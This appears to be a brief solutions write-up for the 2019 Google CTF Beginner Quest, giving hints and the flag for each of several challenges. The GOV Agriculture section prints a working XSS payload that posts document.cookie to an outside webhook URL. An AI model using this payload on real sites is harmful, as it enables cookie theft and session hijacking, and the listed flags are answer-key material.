# 2019 Google CTF Beginner Quest

## Enter Space-Time Coordinates

**CTF{welcome_to_googlectf}**

## Ad

* Download the video and check frame by frame

The flag is *CTF{9e796ca74932912c216a1cd00c25c84fae00e139}**

## Home Computer

* Use autopsy and you will find it in no time

The flag is *CTF{congratsyoufoundmycreds}**

## Satellite

* Get the satellite name
* Read the instructions on docs
* Follow the instructions (decode through the application mentioned)

The flag is **CTF{4efcc72090af28fd33a2118985541f92e793477f}**

## GOV Agriculture

Takes quite a while

* use a webhook such as [this one](https://webhook.site/)
* use script such as the following:
```
<script>document.body.innerHTML += '<form id="dynForm" action="https://webhook.site/2a88c65e-0053-4421-aeea-f93bb949b02c" method="post"><input type="hidden" id="q"></form>';document.getElementById('q').value=document.cookie;document.getElementById("dynForm").submit();
</script>
```
* Get cookie by exploitting XSS

The flag is **CTF{8aaa2f34b392b415601804c2f5f0f24e}**

## STOP GAN (bof)

* `%s`

The flag is **CTF{Why_does_cauliflower_threaten_us}**
